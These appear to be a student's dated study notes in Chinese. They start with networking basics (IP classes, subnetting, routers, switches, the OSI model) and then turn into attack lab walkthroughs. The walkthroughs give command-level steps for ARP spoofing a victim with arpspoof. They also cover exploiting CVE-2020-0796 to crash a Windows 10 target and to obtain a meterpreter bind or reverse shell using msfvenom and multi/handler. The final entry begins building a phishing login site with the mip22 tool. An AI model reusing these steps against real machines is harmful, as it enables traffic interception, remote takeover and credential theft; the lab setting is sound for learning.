周一 12.4

IP的介绍

IP地址是IP协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。

IP地址分类

A类：1.0.0.0 到 127.255.255.255主要分配 给大量主机而局域网网络数量较少的大型网络
B类：128.0.0.0 到191.255.255.255 一般用于国际性大公司和政府机构
C类：192.0.0.0 到223.255.255.255 用于一般小公司校园网研究机构等
D类：224.0.0.0 到 239.255.255.255 用于特殊用途，又称做组播地址
E类：240.0.0.0 到255.255.255.255 暂时保留

公网ip与私网ip

子网掩码的计算

（1)将子网数目转化为二进制来表示
（2)取得该二进制的位数，为 N
（3)取得该IP地址的类子网掩码，将其主机地址部分的的前N位置 1 即得出该IP地址划分子网的子网掩码。

周二 12.5

路由器与交换机

路由器

功能：1、连接外网；2.将从广域网络收到的数据发送给局域网络中的设备并将局域网络需要发送的数据发送到广域网络；3、防火墙；4、集成无线；5.充当交换机

作用：1.网络连接:企业路由器能够在多个子网之间建立连接,实现不同部门之间的通信,促进协作和信息共享。

2.带宽控制:企业路由器能够实现带宽的限制和分配,使得网络的带宽资源得以充分利用。

3.安全防护:企业路由器具有防火墙、VPN等安全控制、加密通信等安全功能,保护企业网络的安全和隐私

周三 12.6

交换机

功能：1、数据转发；2、三层VLAN；3.端口的扩充

作用：1. 实现局域网内设备之间的高速数据交换，提高网络的传输效率和速度。

  1. 实现网络的分段和隔离，可以将网络划分为多个虚拟网段，提高网络的安全性。

  2. 实现不同设备之间的数据交换和转发，可以将数据包从主机发送到目标端口，从而实现不同设备之间的通讯。

  3. 实现网络流量的控制和管理，可以对不同端口、不同用户或不同应用进行流量控制和管理，从而优化网络性能，提高网络的可靠性和稳定性。

冲突域

集线器(Hub)是一种物理层设备，本身不能识别MAC地址和IP地址，由每一台主机自己验证MAC地址来确定是否接收。同一时刻只能传输一组数据，如果发生冲突则需要重传。集线器下连接的所有端口共享整个带宽即所有端口为一个冲突域。

交换机工作在数据链路层的设备通过查找自身系统MAC地址表中的MAC地址与端口对应关系将数据传送到目的端口。交换机在同一时刻可进行多个端口之间的数据传输，因此，交换机起到了分割冲突域的作用，每一个端口为一个冲突域

OSI模型

1.物理层：实现实际终端信号的传输，码流通过物理介质传输。常用设备有：集线器、中继器、网线、双绞线等。
2.数据链路层：提供介质访问和链路管理。把位元合并为字节，然后将字节合并到帧中，以使媒体能够通过数据链路层访问。
3.网络层：IP选址及路由选择。
4.传输层：建立、维护、管理端到端的区别。
5.会话层：建立、管理和维护表示层实体的会话。
6.表示层：数据格式转化，对数据进行加密。
7.应用层：为应用程序提供服务

周四 12.7

利用kali进行app欺骗，对同一网络中的通信设备攻击

1.打开虚拟机kali，将虚拟机网卡设置成桥接模式

2.于物理机windos+R，cmd打开命令行，输入代码ipconfig，查询相关ip

3.开kali虚拟机，打开终端，输入命令“vi /etc/network/interfaces”设置eth0网卡静态IP，修改interfaces文件：
auto eth0
iface eth0 inet static （设置eth0网卡静态）
address 192.168.110.100（IPv4 物理地址附近的地址）
netmask 255.255.255.0（网端）
gateway 192.168.110.1（你的子网掩码）
dns-nameservers 114.114.114.114（你的默认网关）

ESC，输入“：wq”保存并退出

4.输入“service networking restart”重启网络
5.于kali端ping一下WWW.baidu.com看是否ping通。
6.输入安装命令“apt-get install dsniff”

7.输入命令验证安装成功：arpspoof

8.输入命令攻击受害人“arpspoof -i eth0 -t 受害人IP 网关”，完成攻击

11.28 周二

永恒之黑漏洞

1.打开VMware软件，创建虚拟机靶机Win10X64与虚拟机kali linux，关闭靶机防火墙

2.将压缩包CVE-2020-0796-Scanner粘贴至Win10。window+R打开一个命令行于命令行输入“ipconfig”查看Win10的ip,，解压并打开文件夹CVE-2020-0796-Scanner于路径栏输入“cmd”打开命令行。再输入“CVE-2020-0796-Scanner.exe”运行检测工具，输入靶机ip，查看靶机漏洞

3.打开kali虚拟机，将压缩包CVE-2020-0796-PoC-master粘贴至kali系统，解压并打开文件夹CVE-2020-0796-PoC-master，于文件夹空格处右键单击选择“在这里打开终端”进入命令行。

4.输入命令“sudo su”输入密码进入管理员状态。

5.输入命令“pip install ntlm_auth”加入安装包

6.输入命令“python3 CVE-2020-0796.py 靶机的ip地址”，对永恒之黑漏洞进行攻击，致使目标靶机出现蓝屏重启报错的现象。

11.29 周三

永恒之黑的另一种复现以及利用漏洞对靶机进行监听

1.打开VMware软件，创建虚拟机靶机Win10X64与虚拟机kali linux，关闭靶机防火墙

2.将压缩包CVE-2020-0796-Scanner粘贴至Win10。window+R打开一个命令行于命令行输入“ipconfig”查看Win10的ip地址192.168.138.129。,，解压并打开文件夹CVE-2020-0796-Scanner于路径栏输入“cmd”打开命令行。再输入“CVE-2020-0796-Scanner.exe”运行检测工具，输入靶机ip，查看靶机漏洞

3.下载漏洞利用工具，安装在kali中，在kali中利用MSF生成木马：
“msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -b ‘\x00’ -i 1 -f python ”

4.将生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD

5.于kali攻击机中exploit.py文件夹空白处右键，选择“在这里打开终端”，在打开的命令行输入以下命令使靶机蓝屏：python3 exploit.py -ip 192.168.138.129

6.于桌面打开终端输入以下命令使kali进入监听模式：msfconsole

7.输入以下命令使kali对靶机进行监听：
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set rhost 靶机IP
set lport 生成木马时设置的端口 run

8.首次监听失败，重复运行蓝屏代码，再次监听，在没有报错的情况增加蓝屏攻击次数增加监听成功概率，直至监听成功

此次监听为正向链接，kali端链接靶机；还可以进行反向链接，靶机链接kali端，需要将部分命令修改：1.msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.93.129 LPORT=6666 -b ‘\x00’ -i 1 -f python ，此处ip端口为kali端ip位置。2.use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST kali端IP
set lport 生成木马时设置的端口

部分登录页面钓鱼网站的建立

1.于物理机打开代理，Windows+R输入cmd打开命令行，输入命令ipconfig查询物理机ip地址

4.继续输入proxychains4 git clone https://github.com/makdosx/mip22，下载mip22文件![image-20231202171737784](https://cdn.jsdelivr.net/gh/xoxoxooxox/image@main//imgimgimage-20231202171737784.png)
